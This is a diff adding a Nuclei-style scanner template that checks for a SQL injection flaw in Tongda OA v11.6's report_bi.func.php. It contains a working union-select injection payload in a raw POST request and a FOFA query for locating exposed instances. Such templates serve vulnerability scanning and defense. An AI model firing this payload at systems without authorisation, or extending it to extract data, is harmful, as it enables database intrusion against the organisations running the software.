@@ -1,0 +1,42 @@
+id: poc-local-oa-tongda-v11_6-report_bi-SQLinject
+
+info:
+  name: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+  author: capiton
+  severity: high
+  description: 通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    Vulnerability-Impact: 通达OA v11.6
+  tags: tongda
+
+variables:  
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+requests:
+  - raw:
+      - |
+        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Go-http-client/1.1
+        Content-Length: 113
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+1%2C2%2Cmd5%28{{randInt}}%29%23%27&action=get_link_info&
+
+    redirects: false     
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randInt}}"
